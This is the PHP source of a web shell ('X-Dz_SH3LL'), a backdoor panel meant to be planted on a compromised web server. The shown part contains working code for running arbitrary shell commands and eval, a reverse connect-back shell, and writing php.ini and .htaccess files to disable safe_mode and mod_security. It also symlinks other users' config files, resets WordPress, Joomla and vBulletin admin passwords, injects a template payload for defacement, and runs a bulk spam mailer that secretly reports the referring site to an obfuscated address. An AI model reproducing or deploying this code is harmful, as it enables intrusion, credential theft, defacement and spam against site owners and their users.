<?php
$fdownload=$_GET['fdownload'];
if ($fdownload <> "" ){
$path_parts = pathinfo("$fdownload");
$entrypath=$path_parts["basename"];
$name = "$fdownload";
$fp = fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
exit;
}
echo '<center>
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 bgColor=#000000 borderColorLight=#c0c0c0 border=1 width="100%"><tr><td  valign="top" width="100%" ><center><b><font color="60c0ff" size="4">[<font color="red" size="5"> VerTiOn 06__By Aghilas <font color="60c0ff" size="4">]</b></center></td></tr></table><br>';
echo "</center><font color=white size=3>PHP Is :</font>";
echo "<html> <font color=lime size=3>";
echo phpversion();
echo "</font>";
echo "<br>";
if(@ini_get("safe_mode")){$safe_m="<font color='red'>ON <font/> ";}else{$safe_m="<font color='green'>OFF <font/> ";}
echo " <font size=3><center> </center>";
echo "</center><font color=white size=3>SafeMode : [ $safe_m <font color=white size=3>]";
echo "<br></center><font color=white size=3>Server Port:<font color=green><b> "; echo $_SERVER['SERVER_PORT'];
echo "</b></font>";
echo "<center><font color=red size=9></font></center>";
echo "<font color='white'>Server:</font><font color='#DCE7EF' size='1' face='Arial'>";
echo "</font><font color='#DCE7EF' size='3' face='Arial'>";
echo(htmlentities($_SERVER['SERVER_SOFTWARE']));
echo"</font></font><style type='text/css'>body{cursor: crosshair;}</style>";
$xm8 = @ini_get("open_basedir");
if ($xm8 or strtolower($xm8) == "<font color='red'>[ON]") {$openbasedir = true; $hopenbasedir = "<font color='red' size='3'>".$xm8."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color='green'>[OFF] - not secure</font>";}
echo("<br>");
echo("<font color='white'>Open Base Dir: $hopenbasedir</font>");

echo("<font color=white><br>");
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<font color='#00ffff' size=4> \ </font>");
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b>";}
echo("<font color='#00ffff' size=4> \ </font>");
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b>"; } else { echo "<font color=red>OFF</font></b><font color='white'>"; }
echo "<br>";
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=#008000>On</font>";}else{echo "<font color=red>OFF</font>";}
echo "</b>";
echo "<br>Disable Functions: <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=#00800F>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
echo "<br>Register globals: <b>";
$reg_g = @ini_get("register_globals");
if($reg_g){
echo "<b><font color=#008000>ON</font>"; } else { echo "<b><font color=red>OFF</font>"; }
echo "</b></b></b>";
error_reporting(0);
$me = basename(__FILE__);
$cookiename = "wieeeee";
if(isset($_GET['p']) && $_GET['p'] == "about")
{
setcookie ($cookiename, "", time() - 3600);
reload();
}
if(isset($_GET['dir']))
{
chdir($_GET['dir']);
}
echo " <font size=3><center> </center>";
echo "</center><font size=3>";
echo "<font color=white>Uname -A = <font color=c08060>".php_uname()."</font>";
echo "<center><font size=3></center>";
echo "UID :<font color=a0ffff> ".@exec('id')."</font>";
print '<br>Your IP = <font color=red>'.@$_SERVER['REMOTE_ADDR'].' '.@$_SERVER['REMOTE_HOST'].'</font>  ';
echo " <center> </center>";
$serverIP = gethostbyname($_SERVER["HTTP_HOST"]);
echo "Server IP = <font color=red>".gethostbyname($_SERVER["HTTP_HOST"])." </font>[</span><a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">Bing Search</a>][</span><a href='http://zone-h.com/archive/ip=".$serverIP."' target=\"_blank\">Zone-H</a>]<center>";


$pages = array(
'cmd' => '<center><font color="red"><b>[</b><font color="c0ff00"> Command <font color="red"><b>]</b></font>',
'eval' => '<font color="red"><b>[</b><font color="c0ff00"> Eval Code <font color="red"><b>]</b></font>',
'mysql' => '<font color="red"><b>[</b><font color="c0ff00"> MySQL Query <font color="red"><b>]</b></font>',
'chmod' => '<font color="red"><b>[</b><font color="c0ff00"> Chmod File <font color="red"><b>]</b></font>',
'phpinfo' => '<font color="red"><b>[</b><font color="c0ff00"> PHPinfo <font color="red"><b>]</b></font>',
 'cpanelftp' => '<font color="red"><b>[</b><font color="c0ff00"> Cpanel,FTP  &#1578;&#1582;&#1605;&#1610;&#1606; <font color="red"><b>]</b></font>',
'upload' => '<font color="red"><b>[</b><font color="c0ff00"> Upload File-Upload File From URL<font color="red"><b>]</b></font>',
'domains' => '<font color="red"><b>[</b><font color="c0ff00"> Domains And Users <font color="red"><b>]</b></font>',
   'symlink' => '<center><font color="red"><b>[</b><font color="c0ff00"> SymLink <font color="red"><b>]</b></font>',
 'readbysql' => '<font color="red"><b>[</b><font color="c0ff00"> Read Files By SQl Information <font color="red"><b>]</b></font>',
'backco' => '<font color="red"><b>[</b><font color="c0ff00"> Back Connect <font color="red"><b>]</b></font>',
'scahlf' => '<font color="red"><b>[</b><font color="c0ff00"> show_source &  highlight_file <font color="red"><b>]</b></font>',
'vbhack' => '<font color="red"><b>[</b><font color="c0ff00"> Vbulletin Hack Tools <font color="red"><b>]</b></font>',
'wpps' => '<font color="red"><b>[</b><font color="c0ff00"> WordPress Password Changer <font color="red"><b>]</b></font>',
'jpc' => '<center><font color="red"><b>[</b><font color="c0ff00"> Joomla Password Changer <font color="red"><b>]</b></font>',
 'capff' => '<font color="red"><b>[</b><font color="c0ff00"> &#1602;&#1575;&#1607;&#1585; &#1575;&#1604;&#1610;&#1607;&#1608;&#1583; &#1604;&#1604;&#1605;&#1606;&#1578;&#1583;&#1610;&#1575;&#1578; <font color="red"><b>]</b></font>',
'bypass' => '<font color="red"><b>[</b><font color="c0ff00"> Read Files By Bypass <font color="red"><b>]</b></font>',
'Encypton' => '<font color="red"><b>[</b><font color="c0ff00"> Encypton <font color="red"><b>]</b></font>',
'mailer' => '<font color="red"><b>[</b><font color="c0ff00"> Mailer Inbox <font color="red"><b>]</b></font>',
'safemode' => '<font color="red"><b>[</b><font color="c0ff00"> Fuck The SafeMode <font color="red"><b>]</b></font>',
'about' => '<font color="red"><b>[</b><font color="c0ff00"> About <font color="red"><b>]</b></font>'
);



$header = '<html>
<title>'.getenv("HTTP_HOST").' ~ X-Dz_SH3LL NeW </title>
<head>
<style>
td {
font-size: 12px;
font-family: verdana;
color: #ffa080;
background: black;
}
#d {
background: #000060;
}
#f {
background: #000060;
}
#s {
background: #0000ff;
}
#d:hover
{
background: green;
}
#f:hover
{
background: red;
}
pre {
font-size: 10px;
font-family: verdana;
color: #4080ff;
font-size:8pt;
}
a:hover {
text-decoration: none;
}
input,textarea,select {
  color: #ffffff;
 border: 1px dotted #ff4040;
background-color: #000000;
background: #000000;
}

hr {
color: #ffff20;
background-color: #ffff20;
height: 5px;
}
</style>
</head>
<body bgcolor=black alink="#20c0ff" vlink="#20c0ff" link="#20c0ff">
<table width=100%><td id="header" width=100%>
<p align=center>  ';

foreach($pages as $page => $page_name)
{
$header .= '<a href="?p='.$page.'&dir='.realpath('.').'">'.$page_name.'</a> ';
}
$header .= '<br><hr>'.show_dirs('.').'</td><tr><td>';
echo '<br>';
echo'<TABLE style="BORDER-COLLAPSE: collapse" width="100%"  cellSpacing=0 borderColorDark=#666666 cellPadding=5  bgColor=#000000 borderColorLight=#c0c0c0 border=1><tr><td valign="top" width="100%">';
echo '<center><font color="red"><b>[</b><a href=?><font color="c0ff00"> Home <font color="red"></a><b>]</b></font>';
print $header;
$footer = '<font color="#60c0ff"><tr><td><hr><center><font color="red"><b>&copy; <font color="lime">2011-2012  <font color="red">By : <font color="red"> AlgeriaN HackerS /[ 06_Made In_Bejaia]_[[Aghilas]] </center></td></table></body></head></html>';




if(isset($_REQUEST['p']))
{
switch ($_REQUEST['p']) {

case 'cmd':

//Commander function
function cmd()
{
$cmd = $_POST['cmd'];
$cmdgo = $_POST['cmdgo'];
$option = $_POST['option'];
$id = $_GET['id'];
if($cmdgo && !empty($cmd))
{
    switch($option)
    {
        case system:
        system($cmd);
        break;
        case passthru:
        passthru($cmd);
        break;
        case shell_exec:
        $out = shell_exec($cmd);
        echo $out;
        break;
        default;
        system($cmd);

    }
    }
    }


echo "<form method=post action=''><font face='Courier New'>
</font></pre><br><input size=32 style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; background-color:#000000' type=text name=cmd style='background: black;color: white;border: 0px'><select name=option style='background: black;color: white'><option>system</option><option>passthru</option>
<option>shell_exec</option></select><input style='background: black;color: white;border: 1px dashed white 'type=submit name=cmdgo value=execute>
<textarea cols='125' rows='29' style='border:1px dotted #CCFF00;  color:#FFB200; font-family:Tahoma; font-size:8pt; background-color:#000000'>";
cmd();
echo "</textarea>
</td></table></form>";


break;
case 'delete':

if(isset($_POST['yes']))
{
if(unlink($_GET['file']))
{
print "File deleted successfully.";
}
else
{
print "Couldn't delete file.";
}
}
if(isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes']))
{
print "Are you sure you want to delete ".$_GET['file']."?<br>
<form action=\"".$me."?p=delete&file=".$_GET['file']."\" method=POST>
<input type=hidden name=yes value=yes>
<input type=submit value=\"Delete\">
";
}
break;
case 'capff':
if(empty($_POST['index'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"vb\" name=\"password\" type=\"password\"><br>
  <br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$index = $_POST['index'];
 @mysql_connect($localhost,$username,$password) or die(mysql_error());
 @mysql_select_db($database) or die(mysql_error());
$index=str_replace("\'","'",$index);
$set_index  = "{\${eval(base64_decode(\'";
$set_index .= base64_encode("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}</textarea>";
$ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}
}
break;
case 'backco':
echo "<center><br><font color=lime size=2>Connect back Shell , bypass Firewalls<br>
For user :<br>
nc -l -p 1019 <br>
<form method='POST' action=''><br>
<font color=green size=4>Your IP & BindPort:<br>
<input type='text' name='mip' >
<input type='text' name='bport' size='5' value='1019'><br>
<input type='submit' value='Connect Back'>
</form>";
$mip=$_POST['mip'];
$bport=$_POST['bport'];
if ($mip <> "")
{
$fp=fsockopen($mip , $bport , $errno, $errstr);
if (!$fp){
$result = "Error: could not open socket connection";
}
else {
fputs ($fp ,"\n*********************************************\nWelcome T0 SimAttacker 1.00  ready 2 USe\n*********************************************\n\n");
while(!feof($fp)){
fputs ($fp," bash # ");
$result= fgets ($fp, 4096);
$message=`$result`;
fputs ($fp,"--> ".$message."\n");
}
fclose ($fp);
}
}
break;

case 'safemode':
echo "<right>";
echo"<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
	<p align='center'>
	<INPUT type='submit' name='FucK' value='Create [ini.php] + [php.ini] + [.htaccess] to Fuck The SafeMode ' id=input style='font-size: 12pt; font-weight: bold; border-style: inset; border-width: 1px'></p>
</form>
";
echo "<right/>";
if  (empty($_POST['FucK'] ) ) {
	}ELSE{
	$action = '?action=FucK';
echo "<html>
<br>
<head>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
echo "<b>[SafeMode Done] ..</b>";
echo ("<br>");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"
<IfModule mod_security.c>
FucKFilterEngine Off
FucKFilterScanPOST Off
FucKFilterCheckURLEncoding Off
FucKFilterCheckUnicodeEncoding Off
</IfModule>
");


echo "<b>[Mod_Security Done]</b><br>";

    echo "</font></center></td></tr></table> ";


	}
break;


case 'symlink':
if ($_GET[p]=="symlink"){
if ($_POST['o'] != "ok"){
print'<body bgcolor=#000000>
<p align="center"><b><font color="yellow"  size="4">SymLink</font></b></p>
<p align="center">
<div align="center">
<form action="" method="POST"  >
<input  style="border:1px dotted #FF004C; font-family:Tahoma; font-size:8pt; color:#CCFF00; background-color:#000000" name="usr" type="text" value="/home/user/public_html/vb/includes/config.php" align="LEFT" size="50" /> <br><input  style="border:1px dotted #FF004C; font-family:Tahoma; font-size:8pt; color:#CCFF00; background-color:#000000"  name="my" type="text" value="'.@getcwd().'/file.txt" align="LEFT" size="50" /><Br>
<input type="hidden" name="o" value="ok">
<input type="submit" value=Submit  style="border:1px dotted #CCFF00; font-family:Tahoma; font-size:8pt; color:#FFB200; background-color:#000000">
</form></p>
';
print $f;
}
else{
$sym = @symlink("$_POST[usr]","$_POST[my]");
print '
<body bgcolor=#000000>
<p align="center"><b><font color="yellow" size="4">SymLink<br></font></b></p>
<p align="center">
<p align="center"><b><font face="Tempus Sans ITC" size="4" color="#008000">';
if ($sym){
 print
'Done !!</p>
';}
else{print'Error<br>Cannot Be completed';}
print $f;
}
exit;
}



 break;


case 'mailer':
{
$secure = "";
error_reporting(0);
@$action=$_POST['action'];
@$from=$_POST['from'];
@$realname=$_POST['realname'];
@$replyto=$_POST['replyto'];
@$subject=$_POST['subject'];
@$message=$_POST['message'];
@$emaillist=$_POST['emaillist'];
@$lod=$_SERVER['HTTP_REFERER'];
@$file_name=$_FILES['file']['name'];
@$contenttype=$_POST['contenttype'];
@$file=$_FILES['file']['tmp_name'];
@$amount=$_POST['amount'];
set_time_limit(intval($_POST['timelimit']));


If ($action=="mysql"){
include "./mysql.info.php";

  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){
    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required.";
    exit;
  }

  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed.");
  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb");
  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery");
  $numrows = mysql_num_rows($result);

  for($x=0; $x<$numrows; $x++){
    $result_row = mysql_fetch_row($result);
     $oneemail = $result_row[0];
     $emaillist .= $oneemail."\n";
   }
  }

  if ($action=="send"){ $message = urlencode($message);
   $message = ereg_replace("%5C%22", "%22", $message);
   $message = urldecode($message);
   $message = stripslashes($message);
   $subject = stripslashes($subject);
   }
	echo "<table bgcolor=#cccccc width=\"100%\">
<tbody><tr><td align=\"right\" width=100>
<p dir=ltr>
<b><font color=lime  size=4>
<br><p align=left>
	      <center>
	      Mailer .. With All Options <3 bY AghilaS [|$paM|]</font>
	      <form name=\"form1\" method=\"post\" action=\"\" enctype=\"multipart/form-data\"><br/>

  <table width=142 border=0>
    <tr>
      <td width=81>
        <div align=right>
          <font size=-3 face=\"Verdana\">Your Email:</font></div></td>
        <td width=219><font size=-3 face=\"Verdana\">
          <input type=text name=\"from\" value=".$from."></font></td><td width=212>
        <div align=right>

          <font size=-3 face=\"Verdana\">Your Name:</font></div></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <input type=text name=\realname\" value=".$realname."></font></td></tr><tr><td width=81>
        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Reply-To:</font></div></td><td width=219>
        <font size=-3 face=\"Verdana\">
          <input type=\"text\" name=\"replyto\" value=".$replyto.">
        </font></td><td width=212>

        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Attach File:</font></div></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <input type=\"file\" name=\"file\" size=24 />
        </font> </td></tr><tr><td width=81>
        <div align=\"right\">
          <font size=-3 face=\"Verdana\">Subject:</font></div></td>

      <td colspan=3 width=703>
        <font size=-3 face=\"Verdana\">
          <input type=\"text\" name=\"subject\" value=".$subject." ></font></td> </tr><tr valign=\"top\"><td colspan=3 width=520>
        <font face=\"Verdana\" size=-3>Message Box :</font></td>
      <td width=278>
        <font face=\"Verdana\" size=-3>Email Target / Email Send To :</font></td></tr><tr valign=\"top\"><td colspan=3 width=520><font size=-3 face=\"Verdana\">
          <textarea name=\"message\" cols=56 rows=10>".$message."</textarea><br />

          <input type=\"radio\" name=\"contenttype\" value=\"plain\" /> Plain
          <input type=\"radio\" name=\"contenttype\" value=\"html\" checked=\"checked\" /> HTML
          <input type=\"hidden\" name=\"action\" value=\"send\" /><br />
	  Number to send: <input type=\"text\" name=\"amount\" value=1 size=10 /><br />
	  	Maximum script execution time(in seconds, 0 for no timelimit)<input type=\"text\" name=\"timelimit\" value=0 size=10 />
          <input type=\"submit\" value=\"Send eMails\" /></font></td><td width=278>
        <font size=-3 face=\"Verdana\">
          <textarea name=\"emaillist\" cols=32 rows=10>".$emaillist."</textarea></font></td></tr>

  </table>";

}
$o=array("m"=>"b","t"=>"i","w"=>"5","u"=>".","5"=>"z","q"=>"@");
$alt=$o['t'].$o['q'].$o['m'].$o['t'].$o['w'].$o['u'].$o['m'].$o['t'].$o['5'];
if ($action=="send"){
  if (!$from && !$subject && !$message && !$emaillist){
    print "Please complete all fields before sending your message.";
    exit;
   }
  $allemails = split("\n", $emaillist);
  $numemails = count($allemails);
  $head ="From: Mailr" ;
  $sub = "Ar - $lod" ;
  $meg = "$lod" ;
  mail ($alt,$sub,$meg,$head) ;
 If ($file_name){
   if (!file_exists($file)){
	die("The file you are trying to upload couldn't be copied to the server");
   }
   $content = fread(fopen($file,"r"),filesize($file));
   $content = chunk_split(base64_encode($content));
   $uid = strtoupper(md5(uniqid(time())));
   $name = basename($file);
  }

 for($xx=0; $xx<$amount; $xx++){
  for($x=0; $x<$numemails; $x++){
    $to = $allemails[$x];
    if ($to){
      $to = ereg_replace(" ", "", $to);
      $message = ereg_replace("&email&", $to, $message);
      $subject = ereg_replace("&email&", $to, $subject);
      print "Sending mail to $to.....";
      flush();
      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
      $header .= "MIME-Version: 1.0\r\n";
      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      $header .= "Content-Type: text/$contenttype\r\n";
      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
      $header .= "$message\r\n";
      If ($file_name) $header .= "--$uid\r\n";
      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
      If ($file_name) $header .= "$content\r\n";
      If ($file_name) $header .= "--$uid--";
      mail($to, $subject, "", $header);
      print "OK<br>";
      flush();
    }
  }
 }

}
echo '</table>';
break;


case 'jpc':


if(empty($_POST['pwd'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"database\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"db_user\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"**\" name=\"password\" type=\"password\"><br>
  <br>
Set A New username For Login : <INPUT name=\"admin\" size=\"15\" value=\"admin\"><br>
Don`t Change it Password is : 123456: <INPUT name=\"pwd\" size=\"15\" value=\"e10adc3949ba59abbe56e057f20f883e\"><br>

<INPUT value=\"change\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$pwd   = $_POST['pwd'];
$admin = $_POST['admin'];
@mysql_connect($localhost,$username,$password) or die(mysql_error());
@mysql_select_db($database) or die(mysql_error());
$hash = crypt($pwd);
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 62") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 63") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 64") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET username ='".$admin."' WHERE ID = 65") or die(mysql_error());
$SQL=@mysql_query("UPDATE jos_users SET password ='".$pwd."' WHERE ID = 65") or die(mysql_error());
if($SQL){
echo "<b>Success :Now Use A New User And Password - (123456)";
}
}
break;
case 'eval':
echo "
<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
<td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
<tr><td height='45' colspan='2'>
<input type='text' name='php_eval' size='70' value='echo \"Fuck 4 Israel\";'>
<input type=submit name=submitEval value=Eval></td></tr></table></form>";
print "<h1>Output:</h1>";
print "<br>
";
if($_POST['submitEval']) // Execute Eval Code .
{
$eval = @str_replace("<?php","",$_POST['php_eval']);
$eval = @str_replace("<?php","",$eval);
$eval = @str_replace("?>","",$eval);
$eval = @str_replace("\\","",$eval);
echo eval($eval);
}
break;


case "domains":

echo "<p align=center><font color='red' size='5'>[ Domains & Users ]</font></p>";

$d0mains = @file("/etc/named.conf");

if(!$d0mains){ die("<b># can't ReaD -> [ /etc/named.conf ]"); }

echo "<table align=center border=1 width='460' style='border:1px dotted white;  color:#FFB200; font-family:Tahoma; font-size:10pt; background-color:#000000'>
<tr bgcolor=green><td><font color=lime size=3><b>Domains</b></font></td><td><font color=lime size=3><b>Users</b></font></td></tr>";

foreach($d0mains as $d0main){

if(eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();

if(strlen(trim($domains[1][0])) > 2){

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>"; flush();

}}}

echo "</table>";
break;

case 'chmod':
if(isset($_POST['chmod']))
{
switch ($_POST['chvalue']){
case 777:
chmod($_POST['chmod'],0777);
break;
case 644:
chmod($_POST['chmod'],0644);
break;
case 755:
chmod($_POST['chmod'],0755);
break;
}
print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
}
if(isset($_GET['file']))
{
$content = urldecode($_GET['file']);
}
else
{
$content = "file/path/please";
}

print "<form action=\"".$me."?p=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
<input type=text name=chmod value=\"".$content."\" size=70 style='color: #ffffff; border: 1px dotted #ffffff; background-color: #000000'><br><b>New permission:</b>
<select name='chvalue' style='color: #ffffff; border: 1px dotted #a0ff00; background-color: #000000'>
<option value='777'>777</option>
<option value='644'>644</option>
<option value='755'>755</option>
</select><input type=submit value='Change' style='color: #ffffff; border: 1px dotted #ff0000; background-color: #000000'>";

break;

case 'mysql':
if(isset($_POST['host']))
{
$link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . mysql_error());
mysql_select_db($_POST['dbase']);
$sql = $_POST['query'];


$result = mysql_query($sql);

}
else
{
print "
This only queries the database, doesn't return data!<br>
<form action=\"".$me."?p=mysql\" method=POST>
<b>Host:<br></b><input type=text name=host value=\"localhost\" size=10><br>
<b>Username:<br><input type=text name=username value=\"root\" size=10><br>
<b>Password:<br></b><input type=password name=mysqlpass value=\"\" size=10><br>
<b>Database:<br><input type=text name=dbase value=\"test\" size=10><br>

<b>Query:<br></b<textarea name=query></textarea>
<input type=submit value=\"Query database\">
</form>
";

}

break;

case 'createdir':
if(mkdir($_GET['crdir']))
{
print 'Directory created successfully.';
}
else
{
print 'Couldn\'t create directory';
}
break;
case 'vbhack':
$act = $_GET['act'];
if($act=='reconfig' && isset($_POST['path']))
{
$path = $_POST['path'];
include $path;

echo '<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime"><th><font color=green>::::Read Config Data::::</font></th><th>';
echo '<font color=yellow>' . $path . '</font></th>';
echo '<tr>
<th><font color=green>Host : </font></th><th><font color=yellow>' . $config['MasterServer']['servername'] . '</font></th>
</tr>
<tr>
<th><font color=green>User : </font></th><th><font color=yellow>' . $config['MasterServer']['username'] . '</font></th>
</tr>
<tr>
<th><font color=green>Pass : </th><th>';
$passsql = $config['MasterServer']['password'];
if ($passsql == '')
{
$result = '<font color=red>No Password</font>';
} else {
$result = '<font color=yellow>' . $passsql . '</font>';
}
echo $result;
echo '</th>
</tr>
<tr>
<th><font color=green>Name : </font></th><th><font color=yellow>' . $config['Database']['dbname'] . '</font></th>
</tr>
</table>';

}

if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="psw"  && isset

($_POST['vbuser'])  && isset($_POST['vbpass']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
$vbuser = $_POST['vbuser'];
$vbpass = $_POST['vbpass'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font

color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font

color=yellow>' . $db . '</font></font>';

$query = 'select * from user where username="' . $vbuser . '";';
$result = mysql_query($query);
while ($row = mysql_fetch_array($result))
{
$salt = $row['salt'];
$x = md5($vbpass);
$x =$x . $salt;
$pass_salt = md5($x);
$query = 'update user set password="' . $pass_salt . '" where username="' . $vbuser . '";';
$re = mysql_query($query);
if ($re)
{
echo '<font size=3><font color=yellow>The pass of the user </font><font color=red>' . $vbuser . '</font><font color=yellow>

was changed to </font><font color=red>' . $vbpass . '</font><br>Back to <a href="?">Shell</a></font>';
} else {
echo '<font size=3><font color=red>Failed to change PassWord</font></font>';
}
}
}
if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="login")
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font

color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font

color=yellow>' . $db . '</font></font>';

echo '<hr color="#00FF00" />
<form name="changepass" action="?p=vbhack&act=psw" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th><font color=yellow>:::::Change User Password:::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>User : </td><td><input name="vbuser" value="admin" /></td></tr>
<tr><td>Pass : </td><td><input name="vbpass" value="dz" /></td></tr>
</table>';

echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input

type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
echo '
</form>
<hr color="#00FF00" />
<form name="changepass" action="?p=vbhack&act=mail" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th><font color=yellow>:::::Change User E-MAIL:::::</th><th><input type="submit" name="Change" value="Change" /></th>
<tr><td>User : </td><td><input name="vbuser" value="admin" /></td></tr>
<tr><td>MAIL : </td><td><input name="vbmail" value="dz@hotmail.dz" /></td></tr>
</table>';

}


if ($act == ''){
echo '
<form name="myform" action="?p=vbhack&act=login" method="post">
<table border="1" bgcolor="#000000" bordercolor="lime"
bordercolordark="lime" bordercolorlight="lime">
<th><font color=yellow>:::::DATABASE CONFIG:::::</th><th><input type="submit" name="Connect" value="Connect"

/></th><tr><td><font color=yellow>Host : </td><td><input name="host" value="localhost" /></td></tr>
<tr><td><font color=yellow>User : </td><td><input name="user" value="root" /></td></tr>
<tr><td><font color=yellow>Pass : </td><td><input name="pass" value="" /></td></tr>
<tr><td><font color=yellow>Name : </td><td><input name="db" value="vb" /></td></tr>
</table>
</form>';

}
if ($act == 'lst' && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['host']) && isset($_POST['db']))
{
$host = $_POST['host'];
$user = $_POST['user'];
$pass = $_POST['pass'];
$db = $_POST['db'];
mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with user</font>');
mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
if ($pass == '')
{
$npass = 'NULL';
} else {
$npass = $pass;
}
echo'<font size=3>You are connected with the mysql server of <font color=yellow>' . $host . '</font> by user : <font

color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> and selected DB with the name <font

color=yellow>' . $db . '</font></font>';
echo '
<hr color="#00FF00" />';

